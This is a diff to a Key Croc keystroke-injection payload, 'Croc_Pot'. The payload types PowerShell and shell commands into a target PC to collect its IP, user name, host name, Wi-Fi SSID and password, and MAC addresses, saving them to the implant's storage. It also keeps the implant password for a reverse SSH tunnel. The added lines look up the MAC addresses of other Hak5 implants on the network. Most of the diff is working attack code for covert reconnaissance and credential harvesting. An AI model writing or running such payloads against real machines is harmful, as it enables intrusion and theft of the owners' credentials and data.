@@ -4,7 +4,7 @@
 #                (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.2
+# Version:       1.3.1
 # Category:      Key Croc
 
 MATCH crocpot
@@ -18,6 +18,13 @@ PC_PW=LINUX
 #---> Save keycroc passwd in temp folder
 #---> This is used for starting Reverse SSH Tunnel with Target PC
 echo "${CROC_PW}" >> /tmp/CPW.txt
+
+#----Create Croc_Pot folders
+if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
+	LED B
+else
+	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
+fi
 
 #---> Payload variable/remove existing OS detection
 CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
@@ -67,10 +74,22 @@ WINDOWS)
 	Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
 	Q ENTER
 	sleep 3
-	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
+	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
 	Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
 	Q ENTER
 	sleep 3
+	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	Q STRING "arp -a 172.16.32.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\squirrel_mac.txt\""
+	Q ENTER
+	sleep 2
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
+	Q STRING "arp -a 172.16.84.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\turtle_mac.txt\""
+	Q ENTER
+	sleep 2
+	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
+	Q STRING "arp -a 172.16.64.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\bunny_mac.txt\""
+	Q ENTER
+	sleep 2
 	#---> Return back to ATTACKMODE HID mode
 	ATTACKMODE HID
 	sleep 1
@@ -88,8 +107,8 @@ WINDOWS)
 	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
 	echo "$HOST_IP" >> ${CROC_OS}
 	#---> Edit with sed to remove powershell output "r" endlines & remove first character
-	$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
-	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+	$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
+	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
 	Q ENTER ;;
@@ -154,8 +173,20 @@ raspberrypi)
 	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
 	Q ENTER
 	sleep 2
-	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
+	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
+	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Return back to ATTACKMODE HID mode
@@ -217,8 +248,20 @@ parrot)
 	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
-	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 5
+	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
+	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
+	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Unmount keycroc usb drive
@@ -288,8 +331,20 @@ parrot)
 	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
-	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 5
+	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
+	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
+	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Unmount keycroc usb drive
